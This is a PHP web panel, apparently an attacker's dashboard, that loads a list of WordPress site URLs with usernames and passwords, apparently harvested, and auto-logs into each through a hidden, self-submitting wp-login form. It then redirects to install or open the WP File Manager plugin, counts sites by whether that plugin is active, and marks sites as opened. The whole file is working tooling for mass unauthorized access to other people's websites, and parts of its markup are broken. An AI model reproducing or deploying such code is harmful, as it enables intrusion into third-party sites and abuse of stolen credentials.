<?php
session_start();
error_reporting(0);

// ==========================================
//  KONFIGURASI UTAMA
// ==========================================
$pass_login = '1337';
$data_file  = 'live_results.txt';
$log_file   = 'visited_data.json';

// --- AJAX HANDLER ---
if (isset($_POST['action']) && $_POST['action'] == 'mark_visited') {
    $target_url = $_POST['url'];
    $current_data = file_exists($log_file) ? json_decode(file_get_contents($log_file), true) : [];
    if (!is_array($current_data)) $current_data = [];
    
    if (!in_array($target_url, $current_data)) {
        $current_data[] = $target_url;
        file_put_contents($log_file, json_encode($current_data));
    }
    exit('saved');
}

// --- LOGIKA LOGIN ---
if (isset($_POST['do_login'])) {
    if ($_POST['password'] === $pass_login) {
        $_SESSION['is_logged_in'] = true;
    }
}

if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// --- LAUNCHER SYSTEM ---
if (isset($_GET['action']) && $_GET['action'] == 'login') {
    $url  = $_GET['u'];
    $user = $_GET['l'];
    $pass = $_GET['p'];
    $msg  = $_GET['m']; 

    $redirect_to = '/wp-admin/plugin-install.php?s=files&tab=search&type=term';
    if (
        stripos($msg, 'INSTALLED') !== false || 
        stripos($msg, 'ACTIVATED') !== false || 
        stripos($msg, 'Already Active') !== false || 
        stripos($msg, 'Success') !== false
    ) {
        $redirect_to = '/wp-admin/admin.php?page=wp_file_manager#elf_l1_Lw';
    }

    $base_url = preg_replace('/(wp-admin.*|wp-login\.php.*|\/)$/i', '', $url);
    $action_url = rtrim($base_url, '/') . '/wp-login.php';
    $final_redirect = rtrim($base_url, '/') . $redirect_to;
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Authenticating...</title>
    <meta name="referrer" content="origin">
    <style>
        :root { --bg: #0d1017; --card: rgba(34, 38, 52, .72); --stroke: rgba(255,255,255,.14); --text: #eff3ff; --muted:#9ca5bb; --accent:#7aa2ff; }
        * { box-sizing: border-box; }
        body {
            margin: 0; min-height: 100vh; display: grid; place-items: center; color: var(--text);
            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Inter", sans-serif;
            background:
                radial-gradient(circle at 20% -10%, rgba(122,162,255,.35), transparent 38%),
                radial-gradient(circle at 80% 0%, rgba(173,124,255,.22), transparent 35%),
                linear-gradient(160deg, #0b0f17, #111827 40%, #0d1017);
            padding: 20px;
        }
        .box {
            width: min(100%, 360px); padding: 28px; border-radius: 22px; text-align: center;
            border: 1px solid var(--stroke);
            background: var(--card);
            backdrop-filter: blur(18px) saturate(140%);
            -webkit-backdrop-filter: blur(18px) saturate(140%);
            box-shadow: 0 24px 60px rgba(5,10,25,.55), inset 0 1px 0 rgba(255,255,255,.05);
        }
        h2 { margin: 0 0 8px; font-size: 18px; }
        p { margin: 0 0 18px; color: var(--muted); font-size: 13px; }
        input, button {
            width: 100%; border: 0; border-radius: 12px; padding: 13px 14px; font-size: 14px; color: var(--text);
        }
        input { background: rgba(255,255,255,.06); border: 1px solid rgba(255,255,255,.12); outline: none; }
        input:focus { border-color: var(--accent); box-shadow: 0 0 0 3px rgba(122,162,255,.18); }
        button {
            margin-top: 12px; cursor: pointer; font-weight: 700;
            background: linear-gradient(135deg, #6a95ff, #8b7bff);
            box-shadow: 0 8px 20px rgba(122,162,255,.34);
        }
    </style>
</head>
<body>
    <div class="loader"></div>
    <div class="txt">SECURING ACCESS...</div>
    <form id="auto_form" action="<?= htmlspecialchars($action_url) ?>" method="POST" style="display:none;">
        <input type="text" name="log" value="<?= htmlspecialchars($user) ?>">
        <input type="password" name="pwd" value="<?= htmlspecialchars($pass) ?>">
        <input type="checkbox" name="rememberme" value="forever" checked>
        <input type="hidden" name="wp-submit" value="Log In">
        <input type="hidden" name="redirect_to" value="<?= htmlspecialchars($final_redirect) ?>">
    </form>
    <script>setTimeout(function(){ document.getElementById('auto_form').submit(); }, 300);</script>
</body>
</html>
<?php
    exit;
}

// --- GATEKEEPER ---
if (!isset($_SESSION['is_logged_in']) || $_SESSION['is_logged_in'] !== true) {
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Locked</title>
    <style>
        body { background: #131314; color: #e3e3e3; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .box { background: #1e1f20; padding: 40px; border-radius: 16px; width: 100%; max-width: 320px; text-align: center; border: 1px solid #333; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
        input { width: 100%; padding: 14px; margin: 20px 0; background: #0b0c0d; border: 1px solid #333; color: #fff; border-radius: 8px; text-align: center; outline: none; transition: 0.3s; font-size: 16px; }
        input:focus { border-color: #4285f4; box-shadow: 0 0 15px rgba(66, 133, 244, 0.1); }
        button { width: 100%; padding: 14px; background: #4285f4; color: #fff; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 14px; transition: 0.3s; }
        button:hover { background: #3367d6; }
    </style>
</head>
<body>
    <div class="box">
        <h2>System Locked</h2>
        <form method="POST">
           <input type="password" name="password" placeholder="Passphrase" required autofocus>
           <button type="submit" name="do_login">Authenticate</button>
        </form>
    </div>
</body>
</html>
<?php
    exit;
}

// --- DATA PREPARATION & DEDUPLICATION ---
$raw_lines = file_exists($data_file) ? file($data_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) : [];
$visited_list = file_exists($log_file) ? json_decode(file_get_contents($log_file), true) : [];
if (!is_array($visited_list)) $visited_list = [];

// Filter Duplicate Domains
$lines = [];
$seen_domains = [];

foreach ($raw_lines as $l) {
    $parts = explode('|', $l);
    $creds = explode('#', trim($parts[0]));
    if (count($creds) < 3) continue;

    $u_temp = $creds[0];
    
    // Ambil Host/Domain utamanya saja untuk pengecekan duplikat
    $parsed = parse_url($u_temp);
    $host_check = isset($parsed['host']) ? $parsed['host'] : $u_temp;
    $host_check = strtolower(str_replace('www.', '', $host_check)); // Normalisasi

    if (!in_array($host_check, $seen_domains)) {
        $seen_domains[] = $host_check;
        $lines[] = $l;
    }
}

$entries = [];
$inst = 0;
foreach ($lines as $line) {
    $parts = explode('|', $line);
    $creds_raw = trim($parts[0]);
    $msg = isset($parts[1]) ? trim($parts[1]) : '';
    $c = explode('#', $creds_raw);
    if (count($c) < 3) continue;

    $url = $c[0];
    $usr = $c[1];
    $pwd = trim(implode('#', array_slice($c, 2)));

    $clean_url = preg_replace('#^https?://#', '', $url);
    $clean_url = preg_replace('#^www\.#', '', $clean_url);
    $clean_url = explode('/', $clean_url)[0];

    $is_fm = (stripos($msg, 'INSTALLED') !== false || stripos($msg, 'Active') !== false || stripos($msg, 'Success') !== false);
    if ($is_fm) $inst++;

    $entries[] = [
        'url' => $url,
        'usr' => $usr,
        'pwd' => $pwd,
        'msg' => $msg,
        'clean_url' => $clean_url,
        'is_fm' => $is_fm,
        'is_visited' => in_array($url, $visited_list),
    ];
}

$total = count($entries);
$unvisited_entries = array_values(array_filter($entries, fn($entry) => !$entry['is_visited']));
$visited_entries = array_values(array_filter($entries, fn($entry) => $entry['is_visited']));

$active_tab = (isset($_GET['tab']) && $_GET['tab'] === 'visited') ? 'visited' : 'unvisited';
$items_per_page = 20;
$current_page = max(1, (int)($_GET['page'] ?? 1));

$active_entries = $active_tab === 'visited' ? $visited_entries : $unvisited_entries;
$active_total = count($active_entries);
$total_pages = max(1, (int)ceil($active_total / $items_per_page));
if ($current_page > $total_pages) $current_page = $total_pages;

$offset = ($current_page - 1) * $items_per_page;
$paged_entries = array_slice($active_entries, $offset, $items_per_page);

function build_tab_link($tab, $page = 1) {
    return '?' . http_build_query(['tab' => $tab, 'page' => $page]);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>WP MANAGER</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
         :root {
            --bg: #0f1422;
            --glass: rgba(24, 29, 42, 0.72);
            --glass-strong: rgba(23, 28, 40, 0.88);
            --stroke: rgba(255, 255, 255, 0.14);
            --text: #f4f6ff;
            --muted: #9da8c4;
            --accent: #8cb4ff;
            --accent-2: #8f8dff;
            --success: #4ade80;
            --danger: #ff7b8d;
            --warning: #f6d365;
        }
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body {
            margin: 0;
            color: var(--text);
            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Inter", sans-serif;
            background:
                radial-gradient(circle at 8% -8%, rgba(143,141,255,.35), transparent 35%),
                radial-gradient(circle at 90% 0%, rgba(122,177,255,.26), transparent 35%),
                linear-gradient(155deg, #090d16, #10182a 40%, #0c1220);
            min-height: 100vh;
            padding: 18px;
        }
        .app-shell {
            max-width: 1120px;
            margin: 0 auto;
            border-radius: 26px;
            border: 1px solid var(--stroke);
            background: var(--glass);
            backdrop-filter: blur(20px) saturate(150%);
            -webkit-backdrop-filter: blur(20px) saturate(150%);
            box-shadow: 0 28px 80px rgba(1, 5, 18, .55), inset 0 1px 0 rgba(255,255,255,.08);
            overflow: hidden;
        }
        .titlebar {
            background: rgba(255,255,255,.04);
            border-bottom: 1px solid rgba(255,255,255,.08);
            padding: 12px 18px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 16px;
        }
        .traffic { display: flex; gap: 8px; }
        .dot { width: 12px; height: 12px; border-radius: 999px; }
        .dot.red { background: #ff5f57; }
        .dot.yellow { background: #febc2e; }
        .dot.green { background: #28c840; }
        .title { font-size: 12px; color: var(--muted); letter-spacing: .4px; }
        .logout {
            text-decoration: none; color: var(--text); font-size: 12px; font-weight: 600;
            border: 1px solid rgba(255,255,255,.14); border-radius: 999px; padding: 7px 12px;
            background: rgba(255,255,255,.05);
        }
        .content { padding: 20px; }

        .hero {
            border: 1px solid rgba(255,255,255,.1);
            border-radius: 18px;
            padding: 16px;
            background: linear-gradient(140deg, rgba(116,166,255,.17), rgba(137,127,255,.08));
            margin-bottom: 18px;
        }
        .hero h1 { margin: 0; font-size: 20px; }
        .hero p { margin: 6px 0 0; color: var(--muted); font-size: 13px; }

        .stats {
            display: grid;
            grid-template-columns: repeat(3, minmax(0, 1fr));
            gap: 12px;
            margin-bottom: 18px;
        }
        .stat {
            padding: 14px;
            border-radius: 16px;
            background: var(--glass-strong);
            border: 1px solid rgba(255,255,255,.09);
        }
        .stat b { display:block; font-size: 24px; margin-bottom: 2px; }
        .stat span { font-size: 11px; color: var(--muted); text-transform: uppercase; letter-spacing: .8px; }

        .tabs { display: flex; gap: 10px; margin-bottom: 14px; }
        .tab {
            text-decoration: none; color: var(--muted); font-size: 13px; font-weight: 600;
            padding: 10px 14px; border-radius: 12px;
            border: 1px solid rgba(255,255,255,.12);
            background: rgba(255,255,255,.04);
        }
        .tab.active {
            color: var(--text);
            border-color: rgba(140,180,255,.7);
            background: linear-gradient(140deg, rgba(140,180,255,.22), rgba(143,141,255,.18));
        }

        .table-wrap {
            border-radius: 16px;
            overflow: hidden;
            border: 1px solid rgba(255,255,255,.1);
            background: rgba(10, 14, 24, .5);
        }
        .table-head, .row {
            display: grid;
            grid-template-columns: 56px 2fr 1.4fr 120px 72px;
            gap: 10px;
            align-items: center;
            padding: 13px 14px;
        }
        .table-head {
            font-size: 11px;
            text-transform: uppercase;
            color: var(--muted);
            letter-spacing: .7px;
            border-bottom: 1px solid rgba(255,255,255,.08);
            background: rgba(255,255,255,.02);
        }
        .rows { display:flex; flex-direction:column; }
        .row {
            border-bottom: 1px solid rgba(255,255,255,.06);
            transition: .2s;
        }
        .row:last-child { border-bottom: 0; }
        .row:hover { background: rgba(255,255,255,.03); }
        .row.visited {
            background: linear-gradient(90deg, rgba(255,123,141,.16), rgba(255,123,141,.04));
            border-left: 3px solid var(--danger);
            padding-left: 11px;
        }

        .num { color: #8ea0c8; font-size: 12px; }
        .domain { font-weight: 600; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
        .cred { color: #b7c2e0; font-size: 13px; display:flex; align-items:center; gap:8px; }
        .copy {
            border: 1px solid rgba(255,255,255,.15); border-radius: 8px; padding: 3px 8px;
            cursor: pointer; font-size: 11px; color: var(--muted);
        }
        .badge {
            display: inline-flex; align-items:center; justify-content:center;
            min-width: 82px; padding: 6px 10px; border-radius: 999px;
            font-size: 10px; font-weight: 700; letter-spacing: .5px;
        }
        .fm { color: var(--success); background: rgba(74,222,128,.12); border: 1px solid rgba(74,222,128,.28); }
        .ad { color: var(--warning); background: rgba(246,211,101,.12); border: 1px solid rgba(246,211,101,.28); }
        .action { display:flex; justify-content:flex-end; }
        .btn {
            width: 38px; height: 38px; border-radius: 10px; border: 1px solid rgba(140,180,255,.35);
            display: grid; place-items: center; color: #b6ceff; text-decoration: none;
            background: rgba(90,130,255,.12);
        }
        .row.visited .btn { color: var(--danger); border-color: rgba(255,123,141,.3); background: rgba(255,123,141,.14); pointer-events: none; }
        .btn svg { width: 18px; height: 18px; stroke: currentColor; stroke-width: 2; fill: none; }

        .empty { padding: 50px 18px; text-align: center; color: var(--muted); }
        .pagination { display:flex; justify-content:center; flex-wrap: wrap; gap:8px; margin-top: 14px; }
        .page {
            text-decoration: none; color: var(--muted); min-width: 36px; text-align: center;
            padding: 8px 10px; border-radius: 10px;
            border: 1px solid rgba(255,255,255,.14);
            background: rgba(255,255,255,.04);
            font-size: 12px;
        }
        .page.active { color: var(--text); border-color: rgba(140,180,255,.7); background: rgba(140,180,255,.2); }

        @media (max-width: 900px) {
            .stats { grid-template-columns: 1fr; }
            .table-head { display:none; }
            .table-wrap { border-radius: 14px; }
            .row {
                grid-template-columns: 1fr;
                gap: 8px;
                padding: 14px;
            }
            .row.visited { padding-left: 14px; }
            .num { opacity: .8; }
            .action { position: absolute; right: 14px; top: 12px; }
            .row { position: relative; }
            .domain { padding-right: 56px; font-size: 15px; }
            .cred, .status { font-size: 12px; }
        }

        @media (max-width: 560px) {
            body { padding: 10px; }
            .content { padding: 14px; }
            .hero h1 { font-size: 17px; }
            .hero p { font-size: 12px; }
            .tabs { overflow-x: auto; padding-bottom: 4px; }
            .tab { white-space: nowrap; }
            .title { display:none; }
            .logout { padding: 6px 10px; font-size: 11px; }
        }
    </style>
</head>
<body>

<div class="app-shell">
    <div class="titlebar">
        <div class="traffic">
            <span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span>
        </div>
        <div class="title">WP Launcher</div>
        <a href="?logout=true" class="logout">Logout</a>
    </div>

     <div class="content">
        <div class="hero">
            <h1>Domain Control Center</h1>
        </div>
        <div class="stats">
            <div class="stat"><b><?= $total ?></b><span>Total Unique</span></div>
            <div class="stat"><b style="color:var(--success)"><?= $inst ?></b><span>File Mgr</span></div>
            <div class="stat"><b style="color:var(--warning)"><?= $total - $inst ?></b><span>Admin Only</span></div>
        </div>

    <div class="tabs">
            <a class="tab <?= $active_tab === 'unvisited' ? 'active' : '' ?>" href="<?= build_tab_link('unvisited', 1) ?>">UNOPEN (<?= count($unvisited_entries) ?>)</a>
            <a class="tab <?= $active_tab === 'visited' ? 'active' : '' ?>" href="<?= build_tab_link('visited', 1) ?>">OPENED (<?= count($visited_entries) ?>)</a>
    </div>
         
                <div class="table-wrap">
            <div class="table-head">
                <div>#</div><div>Domain</div><div>Credentials</div><div>Status</div><div style="text-align:right;">Action</div>
            </div>
            <div class="rows">
                <?php if ($active_total > 0): foreach ($paged_entries as $index => $entry):
                    $url = $entry['url'];
                    $usr = $entry['usr'];
                    $pwd = $entry['pwd'];
                    $msg = $entry['msg'];
                    $clean_url = $entry['clean_url'];
                    $is_fm = $entry['is_fm'];
                    $is_visited = $entry['is_visited'];
                    $login_link = '?action=login&u=' . urlencode($url) . '&l=' . urlencode($usr) . '&p=' . urlencode($pwd) . '&m=' . urlencode($msg);
                    $no = $offset + $index + 1;
                ?>
                <div class="row <?= $is_visited ? 'visited' : '' ?>">
                    <div class="num"><?= $no ?></div>
                    <div class="domain" title="<?= htmlspecialchars($url) ?>"><?= htmlspecialchars($clean_url) ?></div>
                    <div class="cred">
                        <span><?= htmlspecialchars($usr) ?></span>
                        <span class="copy" onclick="copyToClip('<?= addslashes($pwd) ?>', this)">***</span>
                    </div>
                    <div class="status">
                        <?php if ($is_fm): ?>
                            <span class="badge fm">FILE MGR</span>
                        <?php else: ?>
                            <span class="badge ad">ADMIN</span>
                        <?php endif; ?>
                    </div>
                    <div class="action">
                        <?php if ($is_visited): ?>
                            <span class="btn"><svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg></span>
                        <?php else: ?>
                            <a href="<?= $login_link ?>" target="_blank" class="btn" onclick="markVisited('<?= $url ?>', this)" title="Auto Login">
                                <svg viewBox="0 0 24 24"><path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4"></path><polyline points="10 17 15 12 10 7"></polyline><line x1="15" y1="12" x2="3" y2="12"></line></svg>
                            </a>
                        <?php endif; ?>
                    </div>
               
       </div>

        <?php if ($total_pages > 1): ?>
        <div class="pagination">
            <?php for ($p = 1; $p <= $total_pages; $p++): ?>
                <a href="<?= build_tab_link($active_tab, $p) ?>" class="page <?= $p === $current_page ? 'active' : '' ?>"><?= $p ?></a>
            <?php endfor; ?>
        </div>
        <?php endif; ?>

        <?php if($total_pages > 1): ?>
            <div class="pagination">
                <?php for($p = 1; $p <= $total_pages; $p++): ?>
                    <a href="<?= build_tab_link($active_tab, $p) ?>" class="page-link <?= $p === $current_page ? 'active' : '' ?>"><?= $p ?></a>
                <?php endfor; ?>
            </div>
        <?php endif; ?>
    </div>
</div>

<script>
    function copyToClip(text, el) {
        navigator.clipboard.writeText(text).then(() => {
                  const original = el.innerText;
            el.innerText = 'COPIED';
            el.style.color = '#4ade80';
            el.style.borderColor = 'rgba(74,222,128,.5)';
            setTimeout(() => {
                el.innerText = original;
                el.style.color = '';
                el.style.borderColor = '';
            }, 1000)
        });
    }

    function markVisited(url, btn) {
        const formData = new FormData();
        formData.append('action', 'mark_visited');
        formData.append('url', url);
        fetch(window.location.href, { method: 'POST', body: formData }).then(() => {
            const row = btn.closest('.row');
            if (!row) return;
            row.classList.add('visited');
            btn.outerHTML = '<span class="btn"><svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg></span>';
        });
    }
</script>
</body>
</html>
